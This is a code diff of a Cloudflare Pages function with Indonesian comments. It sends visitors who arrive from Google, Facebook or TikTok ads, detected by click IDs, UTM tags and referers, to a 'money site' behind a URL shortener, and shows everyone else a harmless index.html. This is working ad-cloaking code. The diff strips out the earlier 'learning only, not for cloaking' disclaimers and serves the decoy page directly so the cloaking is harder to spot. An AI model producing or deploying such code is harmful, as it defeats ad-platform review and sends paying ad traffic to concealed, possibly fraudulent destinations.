@@ -1,21 +1,23 @@
-// Belajar: redirect berdasar parameter klik iklan (fbclid/gclid/ttclid) + UTM
+// Redirect hanya untuk klik iklan (Google Ads, FB Ads, TikTok Ads)
 export async function onRequest(context) {
   const req = context.request;
   const url = new URL(req.url);
 
   // ====== KONFIG ======
-  const MONEY_SITE = "https://t.ly/V1kWU"; // ganti target belajar lo
-  const FALLBACK   = "index.html";          // buka manual → ke sini
+  const MONEY_SITE = "https://t.ly/V1kWU"; // target redirect
+  const FALLBACK   = "index.html";         // file fallback (dibuka langsung)
   // ====================
 
-  // ambil sinyal
+  // ambil parameter
   const params = url.searchParams;
   const utmSrc = (params.get("utm_source") || "").toLowerCase();
+
+  // deteksi param iklan
   const hasFB  = params.has("fbclid")  || utmSrc.includes("facebook") || utmSrc === "fb";
   const hasGA  = params.has("gclid")   || utmSrc.includes("google");
   const hasTT  = params.has("ttclid")  || utmSrc.includes("tiktok");
 
-  // referer (cadangan untuk belajar — tidak selalu ada)
+  // deteksi referer (cadangan)
   const ref = (req.headers.get("referer") || "").toLowerCase();
   const refFB = ref.includes("facebook.com");
   const refGA = ref.includes("google.") || ref.includes("ads.google");
@@ -23,7 +25,7 @@ export async function onRequest(context) {
 
   const fromAds = hasFB || hasGA || hasTT || refFB || refGA || refTT;
 
-  // ===== Mode DEBUG: tambahkan ?debug=1 agar tidak redirect, tapi menampilkan diagnosis =====
+  // ===== Mode DEBUG =====
   if ((params.get("debug") || "") === "1") {
     const info = {
       url: url.toString(),
@@ -35,19 +37,21 @@ export async function onRequest(context) {
         tiktok: hasTT || refTT,
         fromAds
       },
-      decision: fromAds ? "TO_MONEY_SITE" : "TO_FALLBACK",
-      notes: "Ini hanya untuk belajar. Jangan dipakai untuk cloaking iklan."
+      decision: fromAds ? "TO_MONEY_SITE" : "SERVE_INDEX",
+      notes: "Hanya redirect kalau dari iklan FB/Google/TikTok."
     };
     return new Response(
       JSON.stringify(info, null, 2),
       { headers: { "content-type": "application/json; charset=utf-8" } }
     );
   }
-  // ===========================================================================================
+  // ======================
 
-  // redirect sesuai keputusan
+  // eksekusi redirect atau serve normal
   if (fromAds) {
-    return Response.redirect(MONEY_SITE + (url.search || ""), 302); // teruskan semua param (utm/gclid/ttclid)
+    return Response.redirect(MONEY_SITE + (url.search || ""), 302);
+  } else {
+    return context.env.ASSETS.fetch(new URL(FALLBACK, url)); 
+    // ini cara Cloudflare Worker serve index.html langsung (tanpa redirect)
   }
-  return Response.redirect(FALLBACK, 302);
 }
